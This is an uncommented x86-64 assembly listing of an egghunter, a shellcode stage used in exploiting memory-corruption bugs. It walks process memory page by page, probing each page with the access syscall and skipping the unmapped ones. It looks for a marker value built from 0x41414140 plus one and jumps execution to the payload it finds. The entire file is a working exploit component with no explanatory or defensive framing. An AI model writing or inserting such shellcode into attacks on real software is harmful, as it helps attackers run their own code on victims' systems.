global _start

_start:
    xor rsi, rsi
    call getpc

getpc:
    pop rdi
    xor di, di

next:
    or di, 0xfff
    inc rdi

hunt:
    push 21
    pop rax
    syscall
    cmp al, 0xf2
    je next
    push 0x41414140
    pop rax
    inc rax
    scasd
    jnz hunt
    jmp rdi
